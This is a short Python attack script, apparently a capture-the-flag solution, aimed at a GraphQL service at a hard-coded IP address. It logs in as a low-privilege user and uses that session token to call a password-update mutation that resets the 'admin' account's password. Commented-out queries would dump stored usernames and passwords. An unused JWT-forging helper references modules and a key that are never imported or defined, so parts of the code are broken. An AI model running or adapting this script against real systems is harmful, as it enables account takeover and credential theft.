import json
import requests

IPADDR = '188.166.152.84'
PORT = 32442
       
def createJWT(username,delta):
    token_expiration = datetime.datetime.utcnow() + datetime.timedelta(minutes=delta)
    
    encoded = jwt.encode(
        {
            'username': username,
            'exp': token_expiration
        },
        key,
        algorithm='HS256'
    )

    return encoded
       
with requests.Session() as s:
    headers = {'Content-Type': 'application/json'}

    query = 'mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }'
    variables = {"username":"hackerman","password":"1234"}
    data = {"query":query,"variables":variables}
    LOGIN_PATH = "/graphql"
    r = requests.post('http://{}:{}{}'.format(IPADDR,PORT,LOGIN_PATH),headers=headers,json=data)
    print(r.json())
    cookies = {"session":r.json()['data']['LoginUser']['token']}
    
    #query = '{ getPhraseList { id, owner, type, address, username, password, note } }'
    #query = 'mutation($username: String!, $password: String!) { UpdateUser { username, password } }'
    query = 'mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }'
    variables = {"username":"admin","password":"4321"}
    data = {"query":query,"variables":variables}
    #data = {"query":query}
    QUERY_PATH = "/graphql"
    r = requests.post('http://{}:{}{}'.format(IPADDR,PORT,QUERY_PATH),headers=headers,cookies=cookies,json=data)
    print(r.json())

